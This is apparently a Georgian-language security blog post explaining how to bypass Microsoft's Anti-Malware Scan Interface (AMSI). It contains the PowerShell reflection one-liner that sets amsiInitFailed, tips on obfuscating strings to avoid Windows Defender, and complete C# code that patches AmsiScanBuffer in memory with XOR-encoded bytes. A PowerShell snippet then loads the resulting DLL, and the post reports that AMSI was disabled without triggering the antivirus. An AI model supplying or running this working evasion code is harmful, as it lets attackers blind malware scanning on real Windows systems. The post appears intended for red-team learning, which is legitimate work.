---
title: "AMSI In-Memory Patching"
date: 2023-03-07T01:38:06+04:00
draft: false
---

# AMSI In-Memory Patching


<br><br>
**AMSI** ანუ **Anti Malware Scan Interface** არის Microsoft - ის მიერ შემუშავებული ტექნოლოგია, რომლის მიზანიც იყო და არის memory ში მავნე signature - ების დაფიქსირება და იგი პირველად გაჩნდა Windows 10 - ში. AMSI - ს შეუძლია შეანელოს "შემტევის" აქტივობები, თუმცა მასზე თავის არიდება არ არის რთული და დროის საკითხია.

თქვენ, რომ დაგუგლოთ `amsi bypass` ან `amsi evasion`, უამრავ გამზადებულ “ქომანდებს” ნახავთ, რომელთა ნახევარი უბრალოდ არ იმუშავებს. მიზეზი კი ის არის, რომ ანტივირუსი, რომელიც სისტემაზე არის, მუდმივად განიცდის განახლებას და “მზა” ქომანდები სულაც არ არის ისეთ “მზამზარეული” როგორიც ერთი შეხედვით ჩანდა.
<!--more-->
მაგალითად, ავიღოთ ეს ქომანდი, რომელიც 2016 წელს არის დაინტიფიცირებული:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

ამ ქომანდის მიზანი არის .NET reflection ტექნიკის დახმარებით მოახერხოს მემორიში `amsiInitFailed` ცვლადის შეცვლა, რის მერეც გაითიშება AMSI.

თუმცა, პრობლემა იმაშია რომ `AmsiUtils` სტრინგი იდენტიფიცირდება როგორც მავნე:

![Untitled](/images/amsi-1/Untitled.png)

მაშასადამე, საჭირო ხდება სტრინგის ე.წ “დამახინჯება” ანუ ობფუსკაცია.

მაგალითად:

![Untitled](/images/amsi-1//Untitled%201.png)

![Untitled](/images/amsi-1//Untitled%202.png)

თუმცა, პრობლემა ჯერ ვერ მოგვარდა. პრობლემა იმაშია რომ მსგავსი ე.წ “ბაიპასის” მეთოდები დამოკიდებულია პიროვნების კრეატიულობაზე (თუმცა დიდად არ მოითხოვს კრეატიულობას). საჭირო ხდება სხვანაირი მიდგომა. საჭიროა ქომანდების ძირფესვიანად გააზრება.

მსგავს შემთხვევებში საჭიროა გავიგოთ რა ქომანდებს ვაკოპირებთ, და ზოგადად როგორ მუშაობს AMSI.

თუმცა ეს პოსტი ეხება ცოტა სხვა საკითხს. იმისათვის, რომ არ ვიწვალოთ ბევრი ახალი იდეის მოფიქრებაზე, დაგვიჭრდება პირდაპირ მემორიში საჭირო ადგილას საჭირო ინსტრუქციების შეცვლა.

მაგალითად, **powershell.exe** როცა ვხსნით, ხდება **amsi.dll** ის ჩატვირთვა, შემდგომ ხდება `AmsiInitialize()` ფუნქციის გამოძახება, რომელიც ამზადებს გარემოს AMSI - სთვის. შემდგომ როცა `powershell` - ში ახალ ქომანდს გავუშვებთ ხდება:

1. `AmsiOpenSession()` ის გამოძახება
2. `AmsiScanBuffer()` ის გამოძახება    **// აქ ხდება შემომავალი ქომანდის შემოწმება**
3. `AmsiCloseSession()` ის გამოძახება ბოლოს.

ამჯერად ავიღოთ `AmsiScanBuffer` და ვნახოთ მისი ინსტრუქციები მემორიში `WinDBG` - ის დახმარებით:

ვსვავთ ე.წ `breakpoint` - ს, `amsi!AmsiScanBuffer` - ზე

**შენიშვნა:** `amsi!` ნიშნავს, რომ ვაკითხავთ `amsi.dll` ფაილს. ხოლო ძახილის შემდგომ ვწერთ ამ dll ში არსებულ დაექსპორტებულ ფუნქციას.

![Untitled](/images/amsi-1//Untitled%203.png)

და როდესაც რაიმე ქომანდს გავუშვებთ, და-trigger-დება:

![Untitled](/images/amsi-1//Untitled%204.png)

![Untitled](/images/amsi-1//Untitled%205.png)

ქვემოთა სურათზე ვხედავთ, რომ მოწმდება არგუმენტები, რომელიც გადავეცით `AmsiScanBuffer` - ს. თუ რაიმე არასწორია, მაშინ “ვხტებით” ინსტრუქციაზე:

```c
# 0x80070057h = E_INVALIDARG
mov eax, 0x80070057h
```

![Untitled](/images/amsi-1//Untitled%206.png)

შესაბამისად აქედან ვიგებთ, რომ თუკი `AmsiScanBuffer` - ს რაიმე რეგისტრი არ მოეწონა, მაშინ ხტება ბოლო ინსტრუქციებზე და ითიშება “amsi”.

დავწეროთ `C#` ში კოდი, რომელიც იპოვის მიმდინარე პროცესის მემორიში არსებულ `amsiScanBuffer` ფუნქციას და შევლის მას.

შენიშვნა: ქვემოთ მოცემულ კოდში, ვაკეთებთ XOR ოპერაციას ქვემოთ მოცემულ ბაიტებზე. რადგან, defender აღიქვავს კონკრეტულ ბაიტებს საეჭვოდ და ათრიგერებს. შესაბამისად აქ დაგვჭირდა XOR ოპერაციის გაკეთება. შემდგომ პოსტებში შევეხებით `AV Evasion` თემებს.
ჩვენი მიზანია `AmsiScanBuffer` - ის პირველი assembly ინსტრუქციები ჩავანაცვლოთ შემდეგი ბაიტებით:

```0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3```

```csharp
using System;
using System.Reflection;
using System.Security.Policy;
using System.Runtime.InteropServices;   // გვჭირდება WinAPI ფუნქციების დაიმპორტებისთვის
using System.Text;
using System.Collections.Generic;

namespace ClassLibrary1
{
    public class Class1
    {
		// საჭირო WinAPI ფუნქციების დეკლარაცია
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        
        public static void runner()
        {
			// amsi.dll მოდულის მისამართის "აღება"
            IntPtr amsiPtr = GetModuleHandle("amsi.dll");
            StringBuilder haha = new StringBuilder();
			// "AmsiScanBuffer" - როგორც ერთ სტრინგს, Defender აღიქვავს, როგორც მავნე signature
            haha.Append("Am");
            haha.Append("si");
            haha.Append("Sc");
            haha.Append("an");
            haha.Append("Buffer");

			// "AmsiScanBuffer" მისამართის აღება amsi.dll მოდულიდან.
            var amsiScanBuf = GetProcAddress(amsiPtr, haha.ToString());

			// ეს hex ბაიტები იყო და-XOR-ებული 0xC სთან - ეს საჭირო იყო defender ისთვის გვერდის ავლისთვის.
            //new opcodes
            byte[] encodedopcodes = new byte[] { 0xB4, 0x5B, 0x0C, 0x0B, 0x8C, 0xCF };
            byte[] decodedOpcodes = new byte[6];
            List<byte> objList = new List<byte>();

            foreach (byte opcode in encodedopcodes)
            {
                objList.Add((byte)(opcode ^ 0xc));
            }
            objList.CopyTo(decodedOpcodes);

			// memory page - ისთვის შესაბამისი პერმიშენების მინიჭება - 0x40
            VirtualProtect(amsiScanBuf, (UIntPtr)encodedopcodes.Length, 0x40, out uint oldProtect);
            Marshal.Copy(decodedOpcodes, 0, amsiScanBuf, decodedOpcodes.Length);
        }
    }
}
```

აღსანიშნავია, რომ ეს უნდა შევინახოთ როგორც `.DLL` ფაილი და შემდგომ იგი უნდა ჩავტვირთოთ როგორც ახალი .NET Assembly:

```powershell
$assem = [System.Reflection.Assembly]::LoadFile("C:\Users\Public\ClassLibrary1.dll")
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

პირველ რიგში დავრწმუნდეთ, რომ ეს ჩვენი სტრინგი: “**AmsiUtils**” დაფიქსირებადია Windows Defender - ის მიერ:

![Untitled](/images/amsi-1//Untitled%207.png)

ჩავტვირთოთ ჩვენი ახალი `.NET Assembly` მიმდინარე პროცესში:

![Untitled](/images/amsi-1//Untitled%208.png)

![Untitled](/images/amsi-1//Untitled%209.png)

შესაბამისად, დავინახეთ რომ პირდაპირ მემორიში "მაქინაციების" დახმარებით მივაღწიეთ მიზანს, გავთიშეთ **AMSI** ისე, რომ ანტივირუსი არ დათრიგერდა.

და ბოლოს, ყურადღებას ვამახვილებ შემდეგ კოდის ნაწილზე:


```csharp
 		[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

```

თუ გსურთ, რომელიმე WinAPI ფუნქციის დაიმპორტება და რომ არ იწვალოთ ამ ფუნქციებისთვის დეკლარაციისთვის პარამეტრების მიწერა, შეგილიათ გამოიყენოთ ეს საიტი: https://www.pinvoke.net/


![Untitled](/images/amsi-1/pinvoke.png)